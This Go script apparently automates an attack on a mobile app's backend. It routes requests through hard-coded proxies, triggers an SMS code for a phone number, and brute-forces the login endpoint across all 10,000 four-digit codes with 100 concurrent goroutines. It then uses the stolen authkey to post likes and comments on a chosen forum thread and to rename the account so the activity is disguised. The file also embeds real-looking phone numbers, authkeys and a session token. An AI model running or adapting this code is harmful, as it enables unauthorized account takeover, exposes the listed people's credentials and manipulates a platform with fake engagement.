package main

import (
	"encoding/json"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/ipiao/remote"
)

var accessalbeProxys = []string{
	"https://1.71.188.37:3128",
	"http://183.56.177.130:808",
	"https://218.60.8.83:3129",
}

var users = []User{
	{"13545635678", ""},
	{"13805790176", "597b39ac7db54feab201cc015d0c9b2f"},
	{"15068879222", "1d01e49589e34594b162edd697a8522f"},
	{"15068169473", "27a71ea4cc414898ab82abbfb081d4f9"},
	{"15068724628", "7c86ba50d30348f883debde5e05bbc42"},
	{"15906690378", "3f0fdbfd25674abaa95aa802da127008"},
}

type User struct {
	Phone   string
	Authkey string
}

func main() {
	// store := remote.NewXiciRedisStore("118.25.7.38:6379", "", remote.XiciProxyTypeNT)
	// // store.Clear()
	// err := remote.InitXiCiIppool([]int{1}, remote.XiciProxyTypeNT, store)
	// if err != nil {
	// 	panic(err)
	// }
	// rs, err := remote.NewProxyRemoteStoreTimeout("https://nsj-m.yy0578.com", 0, store, time.Second*3)
	// if err != nil {
	// 	panic(err)
	// }

	// r, err := rs.New()
	// if err != nil {
	// 	panic(err)
	// }
	var err error
	r := remote.NewProxyRemote("https://nsj-m.yy0578.com", "https://1.71.188.37:3128")
	// r := remote.NewRemote("https://nsj-m.yy0578.com")

	// 获取token
	req := map[string]interface{}{}
	ret := make(map[string]interface{})
	// err = r.Post("/v2/imagescode/gettokennum", req, &ret)
	// if err != nil {
	// 	panic(err)
	// }
	// log.Println("gettokennum:", ret)
	// token := ret["Token"].(string)
	token := "KOn189bBNmbo-DALJ9dGE53MK3FANl5A9_hFB7dcS4EtWrvmtLH8G34fow3tjTfRvH_F4lOJBD-qgr4Jyn0akxe61AJiDHpegfmJssy_jVk="

	// 发送短信
	phone := users[len(users)-1].Phone
	req = map[string]interface{}{
		"deviceId":    "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
		"appVersion":  "1.0.2",
		"deviceName":  "iPhone10.2(iOS11.4)",
		"code":        "3155",
		"smsCodeType": 1,
		"deviceType":  "2",
		"mobilePhone": phone,
		"token":       token,
	}
	err = r.Post("/v1/smsController/sendVerifyCode", req, &ret)
	if err != nil {
		panic(err)
	}
	log.Println("sendVerifyCode", ret)
	time.Sleep(time.Second * 2)
	// 刷登录接口
	var authKey string
	var uid int

	gonums := 100
	done := make(chan int, gonums-1)
	wg := sync.WaitGroup{}
	for i := 0; i < gonums; i++ {
		wg.Add(1)
		go func(c int) {
			nr := remote.NewProxyRemote("https://nsj-m.yy0578.com", "https://1.71.188.37:3128")
			for j := 0; j < 10000/gonums; j++ {
				select {
				case <-done:
					wg.Done()
					return
				case <-time.After(time.Millisecond * 5):
					smsCode := fmt.Sprintf("%04d", c*10000/gonums+j)
					log.Println(smsCode)
					nreq := map[string]interface{}{
						"deviceName":          "iPhone10.2(iOS11.4)",
						"loginAccount":        phone,
						"deviceId":            "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
						"smsVerificationCode": smsCode,
						"appVersion":          "1.0.2",
						"deviceType":          "2",
					}
					nret := map[string]interface{}{}
					err = nr.Post("/v1/userAccount/login", nreq, &nret)
					if err != nil {
						log.Println("login err:", err)
						continue
					}
					if ak, ok := nret["authkey"]; ok {
						authKey = ak.(string)
						wg.Done()
						for k := 0; k < gonums-1; k++ {
							done <- k
						}
						log.Println("login success:", nret)

						if acc, ok1 := nret["userAccount"]; ok1 {
							if accM, ok2 := acc.(map[string]interface{}); ok2 {
								if uidStr, ok3 := accM["id"]; ok3 {
									id, _ := uidStr.(json.Number).Int64()
									uid = int(id)
								}
							}
						}
						return
					}
					log.Println("login return:", nret)
				}
			}
		}(i)
	}
	wg.Wait()

	// 点赞
	req = map[string]interface{}{
		"deviceName": "iPhone10.2(iOS11.4)",
		"deviceId":   "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
		"appVersion": "1.0.2",
		"praisesRelation": map[string]interface{}{
			"detailsId":   654,
			"praisesType": 1,
		},
		"deviceType": "2",
	}
	request1, err := r.CovertRequest("POST", "/v1/bbs/addPraise", req)
	if err != nil {
		log.Println("addPraise CovertRequest error:", err)
	}
	request1.Header.Set("authkey", authKey)
	bs, err := r.CallRequest(request1)
	if err != nil {
		log.Println("CallRequest:", err)
	}
	err = remote.DeJSON(bs, &ret)
	if err != nil {
		log.Println(err)
	}
	log.Println("addPraise return:", ret)

	// 评论
	req = map[string]interface{}{
		"deviceName": "iPhone10.2(iOS11.4)",
		"deviceId":   "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
		"comment": map[string]interface{}{
			"detailsId":   654,
			"commentText": "julyjuly，eating surar?",
		},
		"posterId":   10000007,
		"appVersion": "1.0.2",
		"deviceType": "2",
	}
	request2, err := r.CovertRequest("POST", "/v1/bbs/addComment", req)
	if err != nil {
		log.Println(err)
	}
	request2.Header.Set("authkey", authKey)
	bs, err = r.CallRequest(request2)
	if err != nil {
		log.Println(ret)
	}
	err = remote.DeJSON(bs, &ret)
	if err != nil {
		log.Println(err)
	}
	log.Println("addComment return:", ret)

	// 改名
	req = map[string]interface{}{
		"deviceId":   "4D5535B3-5371-48FC-884C-439A2E493EFF",
		"uid":        uid,
		"appVersion": "1.0.2",
		"deviceName": "iPhone9.2(iOS12.0)",
		"deviceType": "2",
		"sex":        "1",
		"nickName":   "M416最稳",
	}
	request3, err := r.CovertRequest("POST", "/v1/userAccount/updateUserInfoById", req)
	if err != nil {
		log.Println(err)
	}
	request3.Header.Set("authkey", authKey)
	bs, err = r.CallRequest(request3)
	if err != nil {
		log.Println(ret)
	}
	err = remote.DeJSON(bs, &ret)
	if err != nil {
		log.Println(err)
	}
	log.Println("updateUserInfoById return:", ret)

	log.Println(phone, authKey, uid)
}

//**** 实现过程
// 1. 获取验证码token
// 2. 用token获取图形验证码
// 3. 解析验证码图片，得到验证码
// 3.5 前三部目前手动操作，抓包token和验证码，在第四步写死，（可以重复利用 token和图形验证码）
// 4. 根据token，验证码，随机获取一个手机号，调用短信接口（新用户会注册）
// 5. 多线程异步调用登陆接口（轮询验证码0000-9999），成功后获取uid和authkey
// 6,7 根据authkey点赞，评论指定文章
// 8. 调用改名接口，避免界面上出现连号评论
